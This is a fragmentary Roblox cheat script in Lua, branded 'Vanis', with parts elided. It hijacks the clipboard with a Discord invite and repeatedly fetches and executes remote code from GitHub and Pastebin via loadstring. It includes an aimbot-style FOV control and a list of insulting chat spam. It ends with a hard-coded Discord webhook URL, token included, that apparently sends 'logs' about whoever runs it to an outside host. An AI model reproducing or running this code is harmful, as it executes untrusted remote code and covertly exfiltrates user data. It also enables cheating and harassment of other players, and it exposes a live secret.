...
setclipboard("https://discord.gg/dBh7k8uaqR")
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = 'Vanis On Top',
    Text = "",
    Duration = 10
...
loadstring(game:HttpGet("https://raw.githubusercontent.com/TheGodVanis/HTTP-Spy/main/Httpspy.lua"))()

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Mapple7777/UI-Librarys/main/UI-1/UI.lua"))()


local Window = Library:Create("zz/cc","V3 vanis")
...
Tab1:Slider("FOV Size",10,200,function(bool)
Aiming.FOV = bool
end)
...
loadstring(game:HttpGet("https://pastebin.com/raw/Ws1V6GMP"))()
end)
...
Tab2:Button("Trash Talk (N)",function(bool)
...
local garbage = {
"ur bad VanisOnTop";
"sonney boy VanisOnTop";
"ez";
"my grandma has more skill than you VanisOnTop ";
"seed";
"sit son";
"trash";
"LOL";
"LMAO";
"imagine being you right now VanisOnTop";
"xd";
"don't try LOL";
"you lose";
"why do you even try";
...
local url =
"https://discord.com/api/webhooks/933179244350148658/qduTlu9MrPBBBhk_YwlXmBeWz5V4yUbZy2VzDJyCEtywSi5iQ9apSP3GTAGa59itYdiQ"
local data = {
["content"] = " ***Local CC Logs***",
["embeds"] = {
{
